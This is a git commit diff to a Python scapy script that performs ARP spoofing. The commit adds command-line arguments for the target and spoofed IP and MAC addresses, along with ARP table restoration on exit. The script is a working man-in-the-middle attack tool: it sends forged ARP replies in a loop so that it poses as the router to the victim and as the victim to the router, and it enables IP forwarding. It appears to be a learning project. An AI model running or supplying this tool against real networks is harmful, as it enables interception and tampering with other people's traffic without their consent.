8e8722f8a5f5bf4f67d0f77e15b94be0dcd93059
hostuser <hostuser@hostuser.hostuser>
2022-06-28 01:24:44 +1000

    ARP Spoof v1. Added arguments such as IP and MAC, restoring ARP tables, and managing exception. python3.

--- arp_spoofer/arp_spoof.py
+++ arp_spoofer/arp_spoof.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import time
 import subprocess
+import argparse
 import scapy.all as scapy
 
 
@@ -15,16 +16,35 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc  # Retrieving the mac-address of the ip given
 
 
-def spoof(target_ip, spoof_ip):
+def spoof(target_ip, target_MAC, spoof_ip, spoof_mac):
     # op=2 to creat an ARP response
     # pdst -> ip target the one to fool
     # hwdst -> mac target the one to fool
     # psrc -> ip to simulate
     # For more info print(packet.show())
     # For more info print(packet.summary())
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)  # , hwsrc="08:00:00:00:00:3c")
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_MAC if target_MAC else get_mac(target_ip),
+                       psrc=spoof_ip, hwsrc=spoof_mac if spoof_mac else None)
     scapy.send(packet, verbose=False)
 
+
+def restore(destination_ip, destination_MAC, source_ip, source_mac):
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
+                             psrc=source_ip, hwsrc=get_mac(source_ip))
+    scapy.send(packet, verbose=False)
+
+
+parser = argparse.ArgumentParser(description="ARP spoof")
+parser.add_argument('-tip', '--targetIP', dest='target_ip', help="Target ip to fool")
+parser.add_argument('-tmac', '--targetMAC', dest='target_mac', help="Target MAC address to fool")
+parser.add_argument('-spip', '--spoofIP', dest='spoof_ip', help="Target ip to spoof")
+parser.add_argument('-spmac', '--spoofMAC', dest='spoof_mac', help="Target MAC address to spoof")
+
+
+target_ip = parser.parse_args().target_ip
+target_MAC = parser.parse_args().target_mac
+gateway_ip = parser.parse_args().spoof_ip
+spoof_mac = parser.parse_args().spoof_mac
 
 ip_forward_flag = False
 if int(subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"], capture_output=True).stdout.decode()) == 0:
@@ -35,13 +55,15 @@ else:
 sent_packets_count = 0
 try:
     while True:
-        spoof("192.168.180.9", "192.168.180.100")  # telling the victim we're the router
-        spoof("192.168.180.100", "192.168.180.9")  # telling the router we're the victim
+        spoof(target_ip, target_MAC, gateway_ip, spoof_mac)  # telling the victim we're the router
+        spoof(gateway_ip, spoof_mac, target_ip, target_MAC)  # telling the router we're the victim
         sent_packets_count = sent_packets_count + 2
         print("[+] Packets sent: " + str(sent_packets_count), end='\r')
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\r[+] Detected CTRL + C -> QUITING.", end='\n\n')
+    print("\r[-] Detected CTRL + C ... Restoring ARP tables... quiting", end='\n\n')
+    restore(target_ip, target_MAC, gateway_ip, spoof_mac)
+    restore(gateway_ip, spoof_mac, target_ip, target_MAC)
     if not ip_forward_flag:
         ipv4 = subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
         print(ipv4.stdout.decode().replace("net.ipv4.", "Returning ipv4 "))
